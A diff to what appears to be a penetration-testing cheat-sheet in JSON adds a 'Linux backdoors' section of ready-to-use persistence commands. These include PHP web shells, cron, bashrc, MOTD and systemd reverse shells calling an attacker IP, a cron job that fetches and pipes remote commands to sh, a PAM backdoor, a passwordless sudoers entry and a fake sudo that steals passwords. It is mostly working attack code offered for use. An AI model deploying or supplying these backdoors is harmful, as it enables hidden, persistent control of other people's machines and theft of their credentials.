@@ -479,5 +479,97 @@
         "command": "(touch .tab ; echo \"*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/attacker/port 0>&1'\" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1"
       }
     ]
+  },
+  {
+    "title": "Linux backdoors",
+    "description": "What to do to backdoor a linux machine once you got access to it",
+    "tags": [
+      "linux",
+      "backdoor",
+      "php",
+      "ssh"
+    ],
+    "source": [
+      "https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c",
+      "http://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html",
+      "https://tryhackme.com/room/linuxbackdoors",
+      "https://gist.github.com/hoefler02/2ca8166c167f147c8fb076b48eb7cb47",
+      "https://r.0x7359.com/",
+      "https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9",
+      "https://hosakacorp.net/p/systemd-user.html",
+      "https://gist.github.com/ahhh/1d4bf832c5a88cc75adb"
+    ],
+    "data": [
+      {
+        "description": "Add your public SSH key to the compromised user's ~/.ssh/authorized_keys file.",
+        "language": "bash",
+        "command": "#On your machine:\nssh-keygen -f ./backdoor\ncat backdoor.pub \t\t#Copy the public key\n\n#On the compromised machine (substitute <public key>):\necho '<public key>' >> ~/.ssh/authorized_keys\n\n#Connect to the compromised machine with\nssh compromised-user@machine-ip -i backdoor"
+      },
+      {
+        "description": "Web PHP backdoor.\nPut it on some .php file and run it making a request with the parameter 'x'. Works with both GET and POST (POST is stealthier):",
+        "language": "php",
+        "command": "<?php shell_exec($_REQUEST['x']);"
+      },
+      {
+        "description": "Web PHP backdoor (even stealthier):",
+        "language": "php",
+        "command": "#Run commands with\n# curl -H \"x:ls -la\" example.com/backdoor.php\n# curl -H \"x:cat /etc/passwd\" example.com/backdoor.php\n<?php echo shell_exec($_SERVER['HTTP_X']);?>"
+      },
+      {
+        "description": "Tiniest PHP backdoor possible:",
+        "language": "php",
+        "command": "#Run commands with example.com/backdoor.php?0=ls -la\n<?=`$_GET[0]`?>"
+      },
+      {
+        "description": "Crontab backdoor keeping existing crontabs (substitute <ATTACKER IP> and <PORT>):",
+        "language": "bash",
+        "command": "(crontab -l > .tab ; echo \"* * * * * 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER IP> <PORT> >/tmp/f'\" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1"
+      },
+      {
+        "description": "Crontab backdoor overwriting existing crontabs:",
+        "language": "bash",
+        "command": "(touch .tab ; echo \"* * * * * 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER IP> <PORT> >/tmp/f'\" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1"
+      },
+      {
+        "description": "Example sending bash reverse shell every 5 min:",
+        "language": "bash",
+        "command": "(touch .tab ; echo \"*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/<ATTACKER ip>/<PORT> 0>&1'\" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1"
+      },
+      {
+        "description": "Running arbitrary commands every minute with cron via http.\nSet up a webserver and create a file named 'run'. Put on it the commands you want to run on the compromised machine.",
+        "language": "bash",
+        "command": "(crontab -l > .tab ; echo \"* * * * * 'curl https://<ATTACKER IP>/run | sh'\" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1"
+      },
+      {
+        "description": "Bashrc backdoor. Will run everytime a new terminal session is started:",
+        "language": "bash",
+        "command": "echo 'mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER IP> <PORT> >/tmp/f' >> ~/.bashrc"
+      },
+      {
+        "description": "PAM backdoor to log in into any user (root required):",
+        "language": "bash",
+        "command": "#Compilation dependencies: apt install -y  autoconf automake autopoint bison bzip2 docbook-xml docbook-xsl flex gettext libaudit-dev libcrack2-dev libdb-dev libfl-dev libselinux1-dev libtool libcrypt-dev libxml2-utils make pkg-config sed w3m xsltproc xz-utils gcc\n\ngit clone https://github.com/zephrax/linux-pam-backdoor\n#Change 1.4.0 to other existing version if applicable (https://github.com/linux-pam/linux-pam/releases)\n./backdoor.sh -v 1.4.0 -p passw0rd\n#This will generate a pam_unix.so. Copy it to /lib/x86_64-linux-gnu/security/ on the target machine.\n#Now log in into any user using the password 'passw0rd'."
+      },
+      {
+        "description": "Add your unprivileged user to sudoers (substitute <USER>) (root required)",
+        "language": "bash",
+        "command": "echo '<USER> ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"
+      },
+      {
+        "description": "Backdooring SSH message of the day. This will be run whenever someone logs in into the server via SSH:",
+        "language": "bash",
+        "command": "echo -e '#!/bin/sh\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER IP> <PORT> >/tmp/f &' > 20-backdoor && chmod +x 20-backdoor"
+      },
+      {
+        "description": "Backdooring systemd services. Change <ATTACKER IP> and <ATTACKER PORT> and run this script on the compromised machine. The backdoor will run whenever a user logs in into the server:",
+        "language": "ini",
+        "command": "#!/bin/sh\nIP=\"<ATTACKER IP>\"\nPORT=\"<ATTACKER PORT>\"\nSYSTEMD_PATH=\"/usr/lib/systemd/user/ $HOME/.local/share/systemd/user/ /etc/systemd/user/ $HOME/.config/systemd/user/ $XDG_RUNTIME_DIR/systemd/user/\"\nW_PATH=\"\"\nUNIT=\"voodoo.service\"\nUNIT_CONTENT=\"[Unit]\nDescription=Black magic happening, avert your eyes\n\n[Service]\nRemainAfterExit=yes\nType=simple\nExecStart=/bin/bash -c \"exec 5<>/dev/tcp/$IP/$PORT; cat <&5 | while read line; do \\$line 2>&5 >&5; done\"\n\n[Install]\nWantedBy=default.target\"\n\nfor i in $SYSTEMD_PATH; do\n        mkdir -p \"$i\"\n        if [ -w \"$i\" ]; then W_PATH=\"${i%/} $W_PATH\"; fi\ndone\n\nfor k in $W_PATH; do\n        echo \"$UNIT_CONTENT\" > \"$k/$UNIT\"\n\techo \"[*] created voodoo in '$k/$UNIT\"\ndone\n\nsystemctl --user daemon-reload\nsystemctl --user restart $UNIT > /dev/null\nsystemctl --user enable $UNIT"
+      },
+      {
+        "description": "Sudo backdoor for stealing passwords. This will mimics the original sudo binary behavior and gets the user's password. After downloading, edit the file and change 'localhost 31337' on the last lines to your ip and port to receive the information. You can also set up a webserver and curl the password to it:",
+        "language": "bash",
+        "command": "#Change /tmp/sudo if needed\nwget https://raw.githubusercontent.com/nisay759/sudo-backdoor/master/sudo.sh -O /tmp/sudo\nchmod +x /tmp/sudo\necho 'alias sudo=\"/tmp/sudo\"' >> ~/.bashrc"
+      }
+    ]
   }
 ]
